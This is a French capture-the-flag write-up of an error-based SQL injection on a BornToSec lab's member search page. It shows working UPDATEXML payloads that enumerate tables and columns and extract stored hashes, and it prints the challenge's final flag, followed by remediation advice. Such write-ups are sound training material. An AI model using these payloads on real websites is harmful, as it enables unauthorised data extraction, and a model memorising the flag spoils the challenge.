Compte rendu – SQL Injection Error-Based
Challenge : search_member_sql_inj_error_based

Plateforme : BornToSec – WebEx
Cible : http://192.168.133.142
Page vulnérable : index.php?page=member

1. Contexte et objectif

Dans le cadre du WebEx BornToSec, ce challenge consiste à identifier et exploiter une vulnérabilité d’injection SQL de type error-based présente dans la fonctionnalité de recherche des membres.

Les objectifs sont :

confirmer la présence d’une injection SQL,

exploiter la vulnérabilité via le champ web uniquement,

extraire les données de la base,

appliquer la logique applicative attendue,

obtenir et valider le flag final.

2. Identification de la surface d’attaque

La page member contient un formulaire de recherche utilisant la méthode GET :

<form method="GET">
  <input type="hidden" name="page" value="member">
  <input type="text" name="id">
  <input type="submit" value="Submit">
</form>


L’URL générée est :

http://192.168.133.142/index.php?page=member&id=VALUE


Le paramètre id est directement contrôlé par l’utilisateur.

3. Validation de la vulnérabilité SQL
Test initial

Entrée dans le champ ID :

1'


Résultat :

message d’erreur SQL MariaDB visible côté client.

➡️ Injection SQL confirmée, avec affichage d’erreurs exploitables.

4. Exploitation error-based

Le SGBD utilisé est MariaDB.
La fonction UPDATEXML() est utilisée pour provoquer des erreurs SQL contenant des données arbitraires.

Test du canal error-based
1 AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)


Résultat :

XPATH syntax error: '~Member_Sql_Injection~'


➡️ Le canal error-based SQL injection est fonctionnel.

5. Enumération de la base de données
5.1 Nom de la base

Base de données : Member_Sql_Injection

5.2 Enumération des tables
1 AND UPDATEXML(1,CONCAT(0x7e,
(SELECT table_name FROM information_schema.tables
 WHERE table_schema=DATABASE() LIMIT 0,1),
0x7e),1)


Résultat :

~users~


➡️ Une seule table exploitable : users

6. Enumération des colonnes

Afin d’éviter les problèmes liés aux quotes, le nom de la table est utilisé en hexadécimal :

users = 0x7573657273


Colonnes découvertes :

user_id

first_name

last_name

town

country

planet

Commentaire

countersign

7. Extraction des données sensibles
7.1 Extraction de la colonne countersign
1 AND UPDATEXML(1,CONCAT(0x7e,
(SELECT countersign FROM users LIMIT X,1),
0x7e),1)


Valeurs récupérées :

2b3366bcfd44f540e630d4dc2b9b06d
60e9032c586fb422e2c16dee6286cf1
e083b24a01c483437bcf4a9eea7c1b4
5ff9d0165b4f92b14994e5c685cdce2


Format : 32 caractères hexadécimaux

Type : MD5

Conclusion : données intermédiaires, pas le flag final.

8. Analyse applicative – Utilisateur ID 4
8.1 Extraction des données claires
1 AND UPDATEXML(1,CONCAT(0x7e,
(SELECT CONCAT_WS(0x3a,first_name,last_name,planet)
 FROM users LIMIT 3,1),
0x7e),1)


Résultat :

~Flag:GetThe:42~

8.2 Extraction complète du commentaire (par segments)

Le commentaire est extrait via SUBSTRING() :

Decrypt this password -> then lower all the char. Sh256 on it and it's good !


➡️ Le commentaire fournit explicitement la règle de transformation.

9. Interprétation de la règle

La règle indiquée est :

Prendre la valeur en clair associée à l’utilisateur

Mettre tous les caractères en minuscules

Calculer le SHA-256

Le résultat correspond au flag

10. Génération du flag final
Valeur en clair
Flag:GetThe:42

Mise en minuscules
flag:getthe:42

Calcul du SHA-256
echo -n "flag:getthe:42" | sha256sum

Résultat
659b3665adef36100046ae1b9b51845cd456e93903343721f45e455c0d8311d6

11. Flag validé
✅ Flag final
659b3665adef36100046ae1b9b51845cd456e93903343721f45e455c0d8311d6


Ce hash correspond exactement à l’un des flags fournis pour le WebEx.

12. Remédiation

La vulnérabilité est due à :

l’injection directe du paramètre id dans la requête SQL,

l’absence de validation et de typage,

l’affichage des erreurs SQL côté client.

Correctifs recommandés

Utilisation de requêtes préparées

Validation stricte des entrées utilisateur

Désactivation de l’affichage des erreurs SQL

Application du principe du moindre privilège côté base de données

13. Évaluation du risque
Critère	Évaluation
Type	Injection SQL
Exploitabilité	Élevée
Impact	Exfiltration de données
Complexité	Faible
Sévérité	Critique
14. Conclusion

Ce challenge démontre une injection SQL error-based critique, exploitable via un simple paramètre GET non sécurisé.
L’exploitation a permis une énumération complète de la base, suivie d’une analyse applicative conduisant à la récupération du flag final en respectant strictement la logique indiquée par l’application.

Le challenge search_member_sql_inj_error_based est entièrement validé.
